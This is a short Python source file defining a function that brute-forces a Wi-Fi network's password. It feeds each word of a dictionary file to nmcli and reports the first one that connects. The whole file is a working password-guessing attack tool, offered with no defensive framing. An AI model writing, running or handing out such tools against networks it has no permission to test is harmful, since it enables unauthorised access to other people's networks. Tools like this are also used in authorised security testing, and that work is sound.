# core/dictionary_attack.py
import subprocess

def dictionary_attack(ssid, dictionary_path):
    with open(dictionary_path, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                result = subprocess.run(['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', password], capture_output=True, text=True)
                if 'successfully activated' in result.stdout:
                    return f"Password found: {password}"
            except Exception as e:
                return str(e)
    return "Password not found"